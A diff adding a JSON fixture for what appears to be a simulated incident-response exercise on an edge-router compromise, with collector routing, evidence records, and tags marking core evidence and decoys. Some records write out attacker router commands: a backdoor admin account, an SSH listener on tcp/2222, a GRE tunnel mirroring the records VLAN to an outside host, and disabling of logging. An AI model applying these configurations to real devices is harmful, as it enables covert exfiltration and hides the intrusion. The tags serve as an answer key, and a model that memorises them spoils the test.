@@ -1,0 +1,259 @@
+{
+  "routing": {
+    "edge_config": [
+      "running-config",
+      "configuration",
+      "device config",
+      "accounts",
+      "local users",
+      "ssh keys",
+      "authorized-keys",
+      "acl",
+      "access-list",
+      "listener",
+      "non-standard port",
+      "tcp/2222",
+      "tunnel interface",
+      "gre",
+      "monitor session",
+      "span",
+      "mirror",
+      "crypto map",
+      "config-compliance",
+      "config diff",
+      "baseline drift"
+    ],
+    "device_logs": [
+      "device logs",
+      "local log store",
+      "edge-rtr01 logs",
+      "on-box logs",
+      "log clearing",
+      "log gap",
+      "audit log on the device"
+    ],
+    "aaa_accounting": [
+      "aaa",
+      "tacacs",
+      "radius",
+      "authentication records",
+      "admin sessions",
+      "who logged in",
+      "login history",
+      "command accounting",
+      "privileged access records"
+    ],
+    "core_netflow": [
+      "netflow",
+      "flow records",
+      "east-west",
+      "inter-segment traffic",
+      "internal flows",
+      "core router flow"
+    ],
+    "edge_wan_netflow": [
+      "edge wan flow",
+      "uplink egress flow",
+      "wan-side netflow",
+      "edge-rtr01 internet-interface flow",
+      "egress at the edge uplink"
+    ],
+    "oob_tap": [
+      "out-of-band capture",
+      "oob tap",
+      "boundary capture",
+      "internet handoff",
+      "wan-side tap",
+      "wan-side flow or tap",
+      "packet capture at the perimeter",
+      "ndr at the boundary",
+      "edge-egress visibility",
+      "capture upstream of the edge router",
+      "mirror/tap on the internet link"
+    ],
+    "device_integrity": [
+      "firmware integrity",
+      "image signature",
+      "ios image hash",
+      "image verification",
+      "implant check",
+      "rommon",
+      "bootloader"
+    ],
+    "fw_egress": [
+      "firewall logs",
+      "perim-fw01",
+      "perimeter egress",
+      "outbound sessions through the firewall",
+      "deny log"
+    ],
+    "recs_audit": [
+      "records database access",
+      "recs-db01 audit",
+      "database access logs",
+      "sql audit",
+      "host access on the records server"
+    ],
+    "grc_engagement": [
+      "grc",
+      "change ticket",
+      "change management",
+      "pentest authorization",
+      "engagement record",
+      "approval",
+      "system of record"
+    ],
+    "host_edr": [
+      "edr",
+      "endpoint hunt",
+      "workstation",
+      "process/persistence/beaconing on hosts",
+      "host telemetry"
+    ],
+    "egress_visibility": [
+      "edge wan flow",
+      "uplink egress flow",
+      "wan-side netflow",
+      "edge-rtr01 internet-interface flow",
+      "egress at the edge uplink",
+      "out-of-band capture",
+      "oob tap",
+      "boundary capture",
+      "internet handoff",
+      "wan-side tap",
+      "wan-side flow or tap",
+      "packet capture at the perimeter",
+      "ndr at the boundary",
+      "edge-egress visibility",
+      "capture upstream of the edge router",
+      "mirror/tap on the internet link"
+    ]
+  },
+  "records": {
+    "incident_aaa_attacker": "TACACS+/AAA command accounting \u2014 EDGE-RTR01\nAccount 'netadmin' (priv 15), auth=ssh-publickey, src 45.77.31.118 (AS20473, Vultr), dst tcp/2222\n2026-05-27 02:15Z  login; conf t; ip ssh port 2222 rotary 1; line vty rotary 1\n                   access-list 120 permit ip host 45.77.31.118 any\n                   username netadmin privilege 15 secret 9 $9$hR2...; ip ssh pubkey-chain (key added)\n2026-05-28 02:40Z  session present; command accounting sequence gap: seq 4-11 absent (8 records\n                   missing; no corresponding 'clear'); sequence resumes seq 12\n2026-05-29 03:02Z  interface Tunnel1; tunnel mode gre ip; tunnel destination 185.211.34.90\n                   monitor session 1 source 10.20.30.0 0.0.0.255 ; destination Tunnel1 ; acl MIRROR-RECS\n2026-06-02 02:55Z  no logging on ; no logging buffered ; no logging host 10.20.10.50\n2026-05-27 .. 2026-06-12: 10 sessions total, all 22:00-05:00 local. No change ticket references.",
+    "incident_edge_config_malicious": "EDGE-RTR01 running-config (config-compliance pull) \u2014 drift vs 2026-05-26 baseline:\n+ username netadmin privilege 15 secret 9 $9$hR2...\n+ ip ssh pubkey-chain / username netadmin / key-hash ssh-rsa AAAA... (added 2026-05-27)\n+ ip ssh port 2222 rotary 1 ; line vty rotary 1\n+ access-list 120 permit ip host 45.77.31.118 any\n+ interface Tunnel1 ; tunnel mode gre ip ; tunnel source 203.0.113.1 ; tunnel destination 185.211.34.90\n+ monitor session 1 source vlan/records 10.20.30.0/24 ; destination interface Tunnel1 ; filter acl MIRROR-RECS\n+ (2026-06-02) logging disabled: 'no logging on/buffered/host'\nNone of the above carry a change ticket / GRC reference.",
+    "incident_edge_wan_netflow": "EDGE-RTR01 WAN-interface NetFlow (edge-uplink egress, incl. non-TCP/UDP):\nproto 47 (GRE)  outer src 203.0.113.1  dst 185.211.34.90 (AS209588, Seychelles; Abuse.ch-listed; no rDNS)\nsince 2026-05-29; ~55.9 GB egressed; concentrated 22:00-05:00 local; egress:ingress ~17:1.\nNo GRE to this dst before 2026-05-29.",
+    "incident_tap_tunnel": "OOB capture at the internet handoff (upstream of EDGE-RTR01) \u2014 encrypted-traffic metadata only:\n[tunnel]  proto 47 (GRE)  203.0.113.1 -> 185.211.34.90  persistent since 2026-05-29\n          ~55.9 GB egress, off-hours weighted (22:00-05:00), egress:ingress ~17:1, dst Abuse.ch-listed.\n[mgmt]    inbound TCP/2222 SSH sessions from 45.77.31.118 (AS20473, Vultr) since 2026-05-27,\n          off-hours, ~10 sessions. Payload encrypted; contents not recoverable from metadata.",
+    "edge_config_benign_view": "EDGE-RTR01 running-config (config-compliance pull) \u2014 matches 2026-05-26 known-good baseline:\nusername svc-monitoring privilege 5 ; aaa group tacacs+ ; standard MGMT_ACCESS ACL\ncrypto map S2S 10 -> peer 198.51.100.7 (documented partner site-to-site VPN)\nNo non-standard listener ports; no Tunnel interfaces; no monitor/SPAN sessions; logging enabled.",
+    "device_logs_cleared_gap": "EDGE-RTR01 local log store \u2014 current contents:\nEarliest retained entry: 2026-06-04 09:14Z. No entries before that timestamp. No logging-clear,\nrotation, or reload event is recorded in the store to account for the absence.",
+    "device_logs_intact": "EDGE-RTR01 local log store \u2014 current contents:\nContinuous entries from 2026-05-13 onward; routine interface/auth/ntp events; no gaps; no anomalies.",
+    "aaa_legit_only": "TACACS+/AAA records \u2014 EDGE-RTR01 / PERIM-FW01:\nneng-rkaur, neng-tpatel \u2014 SSH from NOC-JUMP01 (10.20.10.10), business hours, routine show/config.\nextpt-coalridge \u2014 2026-06-05..07 from 192.0.2.10/11/12 (pentest window), read-only show commands.\nNo sessions on tcp/2222. No sessions from 45.77.31.118. No 'netadmin' account present in records.",
+    "device_integrity_selfreport_untrusted": "EDGE-RTR01 integrity: the device self-reports its IOS image signature as valid. This is the\ndevice's own management-plane self-report and cannot be independently verified from the device.\nOut-of-band firmware/image forensics (offline hash vs vendor known-good, ROMmon/bootloader review)\nare required to confirm or refute. Treat as device self-report, not independent verification.",
+    "core_netflow_eastwest": "CORE-RTR01 NetFlow \u2014 inter-segment (east-west) only. No coverage of EDGE-RTR01's WAN uplink.\nRecords show normal mgmt<->corp<->records flows. No flows to 185.211.34.90 or 45.77.31.118 observed\non any internal interface (such traffic, if present, transits the WAN uplink not captured here).",
+    "edge_wan_netflow_benign": "EDGE-RTR01 WAN-interface NetFlow: routine egress to Microsoft/365, partner S2S VPN peer\n198.51.100.7, and general internet. No GRE to non-partner destinations; no Abuse.ch-listed peers;\nno off-hours egress anomalies.",
+    "fw_egress_offpath": "PERIM-FW01 logs cover internal-segment TCP/UDP egress. PERIM-FW01 is not inline on EDGE-RTR01's\nWAN uplink; GRE/traffic sourced from 203.0.113.1 directly to an internet peer does not transit\nthis firewall and is not captured. No sessions to 185.211.34.90 / 45.77.31.118 in the internal\negress it does cover.",
+    "recs_audit_legit": "RECS-DB01 access audit: application service accounts and the nightly billing job\n(sp_BillingCycle_Monthly) only. No anomalous interactive or external access. (Host audit cannot\nobserve traffic captured by an upstream port-mirror; it reflects host-level access only.)",
+    "host_edr_clean": "Host EDR (CORP-WS01/02/03, NOC-JUMP01, RECS-DB01): no beaconing, no persistence mechanisms, no\ncredential-dumping, no anomalous process lineage. Nothing actionable.",
+    "grc_pentest_record": "GRC system of record \u2014 engagement PT-2026-04 \"External Network Pen Test \u2014 Edge Infrastructure\":\nvendor Coalridge Security; internal owner neng-rkaur; approver director mgmt-dkirwan (signed\n2026-06-04 08:55Z); authorized window 2026-06-05..06-07; scope edge-rtr01/fw01 READ-ONLY, no\ninternal-segment access; approved source IPs 192.0.2.10/11/12; change ticket CHG-2026-0819;\naccount extpt-coalridge auto-disabled 2026-06-08; final report delivered. Test tunnel GRE\n203.0.113.1<->192.0.2.50 active only in-window, torn down 2026-06-07 17:55Z. Residual rollback:\n192.0.2.0/24 permit still in MGMT_ACCESS ACL (CHG-2026-0821, unscheduled).",
+    "baseline_spray_103": "EDGE-RTR01 RA-VPN auth / PERIM-FW01 deny log: ~500 failed attempts from 103.41.0.0/24 (Mumbai,\nAS136557) on 2026-06-08 09:14-10:47Z, cycling generic usernames; zero successful authentications;\nall denied at the MGMT_ACCESS/OUTSIDE_IN ACL; no internal reach (CORE-RTR01: 0 flows).",
+    "baseline_legit_span": "CORE-RTR01 monitor session -> NOC-MON01, change ticket CHG-2026-0731, account svc-noc-mon,\ndocumented performance monitoring. Destination is the internal NOC monitoring host.",
+    "baseline_undoc_legit_change": "CORE-RTR01 config: SNMP community + NTP server change on 2026-06-03 by neng-tpatel from\nNOC-JUMP01. No change ticket on file. Confirmed routine/benign by NOC.",
+    "tap_benign": "OOB capture at the internet handoff \u2014 encrypted-traffic metadata only:\nOnly tunnel observed: the documented partner S2S VPN, 203.0.113.1 <-> 198.51.100.7 (matches the\ncrypto map in config). Routine internet egress otherwise. No rogue tunnels; no off-hours anomalies;\nno inbound sessions on non-standard management ports."
+  },
+  "record_tags": {
+    "incident_aaa_attacker": {
+      "tags": [
+        "aaa_attacker_session"
+      ],
+      "core": true
+    },
+    "incident_edge_config_malicious": {
+      "tags": [
+        "config_diff_unauthorized"
+      ],
+      "core": true
+    },
+    "incident_edge_wan_netflow": {
+      "tags": [
+        "core_rtr_netflow_egress"
+      ],
+      "core": true
+    },
+    "incident_tap_tunnel": {
+      "tags": [
+        "oob_tap_persistent_tunnel"
+      ],
+      "core": true
+    },
+    "edge_config_benign_view": {
+      "tags": [
+        "config_clean_edge_rtr01",
+        "decoy_legit_vpn"
+      ],
+      "core": true
+    },
+    "device_logs_cleared_gap": {
+      "tags": [],
+      "core": false
+    },
+    "device_logs_intact": {
+      "tags": [],
+      "core": false
+    },
+    "aaa_legit_only": {
+      "tags": [
+        "aaa_absence_attacker"
+      ],
+      "core": true
+    },
+    "device_integrity_selfreport_untrusted": {
+      "tags": [],
+      "core": false
+    },
+    "core_netflow_eastwest": {
+      "tags": [],
+      "core": false
+    },
+    "edge_wan_netflow_benign": {
+      "tags": [],
+      "core": false
+    },
+    "fw_egress_offpath": {
+      "tags": [],
+      "core": false
+    },
+    "recs_audit_legit": {
+      "tags": [
+        "recs01_access_audit"
+      ],
+      "core": false
+    },
+    "host_edr_clean": {
+      "tags": [],
+      "core": false
+    },
+    "grc_pentest_record": {
+      "tags": [
+        "competing_pentest_pt2026_04",
+        "pentest_pt2026_04_record"
+      ],
+      "core": false
+    },
+    "baseline_spray_103": {
+      "tags": [
+        "competing_spray",
+        "spray_zero_success"
+      ],
+      "core": false
+    },
+    "baseline_legit_span": {
+      "tags": [
+        "decoy_legit_span"
+      ],
+      "core": false
+    },
+    "baseline_undoc_legit_change": {
+      "tags": [
+        "decoy_undocumented_changes"
+      ],
+      "core": false
+    },
+    "tap_benign": {
+      "tags": [
+        "decoy_legit_vpn"
+      ],
+      "core": false
+    }
+  },
+  "default_note": "No collector in scope covers that request; found: false."
+}
